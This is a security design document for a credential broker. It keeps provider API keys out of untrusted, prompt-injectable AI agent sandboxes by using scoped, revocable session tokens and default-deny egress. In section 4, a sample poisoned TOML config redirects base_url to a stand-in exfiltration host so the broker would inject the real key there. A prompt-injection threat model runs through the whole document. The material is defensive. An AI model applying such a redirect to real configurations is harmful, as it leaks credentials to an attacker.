# Credential broker

The deployment this document is for: **one provider key, owned by the platform,
serving many sandboxes** — a hosted product where each user gets a cloud sandbox, or a
training run with thousands of rollouts. In that shape the agent is untrusted (it reads
web pages, it is prompt-injectable) and it shares a uid, a filesystem and a process
namespace with `media-ai`. Whatever `media-ai` can read, the agent can `cat`.

So the question is not how to hide the key from the agent inside the sandbox. It cannot
be hidden. The question is **how to not put it there.**

> **The invariant:** the sandbox holds a *capability*, never a *credential*. A total
> compromise of a sandbox yields a token that is scoped, metered, expiring and
> revocable — never a reusable provider key.

`media-ai` already ships the client half of this: `credential = "broker://host"`
resolves to a `BrokeredHandle` that carries a session token and no secret
(`credentials/reference.py`, `providers/_base.py::_auth`). What follows is the service
half, plus the four client gaps that have to close before it actually holds.

---

## 1. Trust zones

```mermaid
flowchart TB
    subgraph U["Zone U — untrusted · assume full compromise"]
        AG["Agent / harness<br/>prompt-injectable, has a shell"]
        CLI["media-ai<br/>credential = broker://broker.internal<br/>session token from disk"]
        AG -->|argv| CLI
    end

    subgraph T["Zone T — trusted · no user code ever runs here"]
        ISS["Issuer<br/>mints scoped session tokens"]
        BRK["Broker<br/>authn · authz · inject · meter"]
        KMS["Key store / KMS<br/>the provider keys"]
        BRK --> KMS
    end

    subgraph P["Zone P — provider"]
        API["Provider API"]
        CDN["Provider CDN<br/>signed artifact URLs"]
    end

    ORCH["Sandbox orchestrator"] -->|"1 · mint(scope, budget, ttl)"| ISS
    ORCH -->|"2 · boot with token"| U
    CLI -->|"3 · provider wire format<br/>+ X-Media-Session"| BRK
    BRK -->|"4 · + Authorization: real key"| API
    CLI -->|"5 · fetch artifact"| BRK
    BRK --> CDN
    CLI -.->|"refused: default-deny egress"| API
```

Three rules give the picture its meaning:

- **The sandbox can reach the broker and nothing else.** Default-deny egress is not
  belt-and-braces here, it is half the design. Without it, a compromised agent
  exfiltrates whatever it likes and the broker only protects the key, not the data.
- **The sandbox never mints or upgrades its own token.** The orchestrator calls the
  issuer *before* the sandbox exists and hands the token in. There is no endpoint the
  sandbox can call to widen its own scope.
- **Zone T runs no user code.** The broker is the new crown jewel; keep it small and
  boring. Every feature added to it is a feature in the blast radius.

## 2. The session token

Opaque, 256 bits of randomness, meaningless outside the broker's session store:

```
session
  id          "s_9f3c…"                      # the bearer value, in the sandbox
  sub         "rollout-42" | "user-8171"     # who this spend belongs to
  allow       ["volc-ark/seedance-2.0",      # binding ids, not providers:
               "gemini/nano-banana-2"]       #   one provider, several prices
  upstreams   {volc-ark: ["ark.cn-beijing.volces.com"],
               gemini:   ["generativelanguage.googleapis.com"]}
  artifacts   ["*.volccdn.com", "generativelanguage.googleapis.com"]
  budget      {calls: 200, spend_usd: 5.00}
  exp         boot + max_job_duration + margin
  state       active | revoked | exhausted
```

**Opaque with a server-side lookup, not a JWT.** Revocation is the entire point of this
design — a token seen in a log or lifted from a compromised box must die *now*, not at
expiry — and a self-contained token turns that into a denylist you have to consult
anyway. The workload makes the lookup free: an image is seconds and a video is minutes,
so a memory-cached lookup is noise next to the call it authorizes.

**Scope by binding id, not by provider.** `volc-ark` serves Seedance and three Seedream
models at different prices; a token scoped to the provider is a token scoped to the most
expensive thing behind it. Binding ids are what `media-ai` already uses everywhere else,
so this stays the same vocabulary as `bindings list` and the usage ledger.

**Exclude what cannot be brokered at issue time, not at call time.** If a binding's wire
path has a leg the broker cannot carry (see §5), leave it out of `allow`. A session that
refuses at minute nine of a job is a worse failure than one that never offered the
binding.

## 3. The request path

```mermaid
sequenceDiagram
    autonumber
    participant O as Orchestrator
    participant I as Issuer
    participant S as Sandbox<br/>(agent + media-ai)
    participant B as Broker
    participant P as Provider

    O->>I: mint(sub=rollout-42, allow=[volc-ark/seedance-2.0], budget, ttl)
    I-->>O: opaque token — carries no provider key
    O->>S: boot: token at 0600 on disk, egress = broker only
    Note over S: the agent decides what to generate<br/>and never sees a provider key
    S->>B: POST /api/v3/contents/generations/tasks<br/>X-Media-Provider · X-Media-Upstream · X-Media-Session
    B->>B: authorize (§4)
    B->>P: the same request + Authorization: «real key»
    P-->>B: 202 {task_id}
    B-->>S: 202 {task_id} — byte-for-byte
    S->>B: GET …/tasks/{id}   (poll)
    B->>P: forwarded
    P-->>B: succeeded {video_url on the CDN}
    B-->>S: verbatim
    S->>B: POST /fetch {url: video_url}
    B->>B: host ∈ session.artifacts?
    B->>P: GET video_url  (+ key, where the CDN needs one)
    P-->>B: bytes
    B-->>S: bytes
    B->>B: meter: sub · binding · scene · cost
```

**The broker is transparent to the wire protocol.** It forwards method, path, headers
and body unchanged, and returns the provider's response — including error bodies —
unchanged. This is not politeness: `media-ai`'s adapters parse provider-shaped
responses and map provider-shaped errors (`providers/*.py::_error`), so a broker that
rewrote either would break the error taxonomy and every exit code derived from it. The
broker swaps one header and enforces policy. Nothing else.

The one exception is the broker's *own* refusals (§4), which have no provider
equivalent. Give them the shape the provider would use for the same class — 401 for a
dead session, 429 with `Retry-After` for an exhausted budget — so `media-ai` maps them
to `auth` (exit 4) and `rate_limit` (exit 5) without knowing a broker exists.

## 4. Authorization, and the rule that carries the design

```mermaid
flowchart TB
    R["request from the sandbox"] --> A{"session active,<br/>unexpired, not revoked?"}
    A -->|no| E401["401 · session_invalid"]
    A -->|yes| C{"binding ∈ session.allow?"}
    C -->|no| E403a["403 · binding_not_permitted"]
    C -->|yes| D{"X-Media-Upstream ∈<br/>session.upstreams[provider]?"}
    D -->|no| E403b["403 · upstream_not_allowed"]
    D -->|yes| F{"budget remaining?"}
    F -->|no| E429["429 · quota_exhausted"]
    F -->|yes| G["inject Authorization from KMS"]
    G --> H["forward verbatim"]
    H --> M["meter + audit: sub · binding · cost"]
```

**`X-Media-Upstream` selects; it never defines.** The header is sent by the sandbox
(`providers/_base.py::_auth` fills it from the binding's `base_url`), and `base_url` is
an ordinary config field that `bindings add` and `config import` can write. So a
prompt-injected agent — or a poisoned configuration bundle carrying no credentials at
all — can do this:

```toml
[bindings."volc-ark/seedance-2.0"]
base_url   = "https://exfil.example/v3"
credential = "broker://broker.internal"
```

and a broker that trusts the header will dutifully inject the real key into a request
forwarded to the attacker. That single mistake converts the whole design back into "the
key is in the sandbox", except now it leaks silently and from the component you trusted
most. **The upstream must be a member of a set the token already carries**, and the
membership test belongs to the broker, which is the only party the sandbox cannot edit.

Everything else on that path is ordinary, and all of it is per-session so that "which
rollout burned the budget" is answerable from the audit log alone.

## 5. What the current client cannot broker yet

Two wire paths in this repo do not go through `_prepare`, so they do not go through the
broker. Both are visible in the code today.

**Artifact downloads bypass it entirely.** `volc_ark.py:212,297,301` and `gemini.py:276`
call `HttpClient.download(<absolute provider URL>)`, and `_http.py::_send` issues that
URL as given — no base URL, no broker. Three consequences, in increasing order of how
much they matter:

1. Under default-deny egress, every download fails.
2. Allowlisting the CDNs re-opens egress, and the hosts are not narrow —
   `storage.googleapis.com` is *anyone's* bucket, so allowing it hands a compromised
   agent a clean exfiltration channel.
3. Gemini's download is annotated `# the file URI needs the API key` — in broker mode
   `media-ai` holds no key, so brokered Gemini downloads are **already broken**.

The answer is a second broker verb: `POST /fetch {url}`, same session header, host
checked against `session.artifacts`, key injected where the CDN wants one, bytes
streamed back. On the client side, `HttpClient.download` routes through the broker
whenever the credential is brokered.

**Gemini's resumable Files upload talks to a Google endpoint of its own.** The code
already knows: `HttpAdapter.brokered()` exists precisely so `gemini.py:90` can refuse
rather than send a request with no key. Either the broker proxies that endpoint too, or
`gemini/*` image-input scenes stay out of `session.allow` — decided at issue time, per
§2.

## 6. Asynchronous jobs decide the token lifetime

Video generation is create → poll → download, and it runs for minutes to hours. Two
consequences:

- **`exp` must exceed the longest job**, or the poll that finishes a billed task dies
  holding nothing. Budget the TTL as `max_job_duration + margin`, and let the broker
  re-authorize a poll by `task_id` if you want tighter TTLs later.
- **`media-ai job query` runs in a later process**, often after the one that submitted
  the job is gone. It re-reads the token from the environment
  (`MEDIA_CRED_BROKER_TOKEN`), which means a rotated token cannot reach a process that
  is already running, and a token refreshed by the orchestrator cannot reach the
  sandbox at all. Reading it from a **file** the bootstrap can rewrite fixes both, since
  credentials are re-resolved per invocation by design.

## 7. Blast radius

| The attacker gets | They can | They cannot |
|---|---|---|
| Root in one sandbox | Spend that session's remaining budget, on that session's bindings, against allowlisted upstreams, until `exp` or revocation | Obtain a reusable provider key · reach any host but the broker · touch another user's session |
| A prompt injection | The same, more quietly — which is why per-session metering is the detection surface | The same |
| A poisoned config bundle | Nothing extra: the upstream check (§4) rejects the redirect | Redirect the key anywhere |
| The session token, off-box | The same as root in the sandbox, minus the sandbox | Anything after you revoke it — one call, immediate |
| The broker | Everything | — keep Zone T small, keys short-cached from KMS, and no user code in it, ever |

## 8. What `media-ai` has to change

Small, and none of it is architectural — the `broker://` scheme, the reveal-only
`Secret`, and per-invocation resolution already do the hard part.

| | Change | Why |
|---|---|---|
| P0 | Refuse (or require an explicit flag for) a `base_url` override on a **brokered** binding, and report `base_url` changes in `config import` | The client half of §4. Defence in depth: the broker must check regardless, but the CLI should not silently accept a redirect either |
| P0 | Route `HttpClient.download` through the broker when the credential is brokered | §5 — without it, brokered video and image downloads do not work under a sane egress policy |
| P1 | `MEDIA_CRED_BROKER_TOKEN_FILE` beside the env var | §6 — refreshable tokens for long jobs |
| P1 | Manifest flag for wire paths a broker cannot carry; `capabilities --configured` reports it | §5 — lets the issuer compute `allow` from the manifests instead of a hand-kept list |
| P2 | `doctor` check: brokered binding + non-default `base_url` → warn | Makes a redirect visible offline |

## 9. What the broker is not

Not a cache, not a model router, not a retry layer, not a place to put business logic.
`media-ai` already owns retries and their idempotency rule (429 always; 5xx only on
GET/DELETE, so a create-task cannot double-submit a billed job), and a broker that
retried underneath would break that guarantee invisibly. Every capability added to Zone
T is a capability an attacker gets on the day the broker is compromised.

## 10. Alternatives, and why they lose

- **Inject the shared key as an environment variable.** One prompt injection leaks a key
  that serves the whole fleet, and in training that is thousands of chances per run. The
  file-versus-env distinction only matters for *per-user* keys, where the blast radius
  is one user.
- **Per-tenant provider sub-keys.** Genuinely better than one shared key where the
  provider supports scoped keys with quota — the blast radius becomes one tenant. But
  the key is still plaintext inside an untrusted sandbox, so it is a smaller version of
  the same failure, not a different one. Worth doing *with* a broker, not instead of.
- **Sign requests in the sandbox.** Any scheme where the sandbox proves possession needs
  something to possess. That is the thing we are trying not to ship.
- **Trust the agent.** The agent's input is arbitrary text from the internet. It is not
  a principal you can trust; it is a program someone else is partly writing.
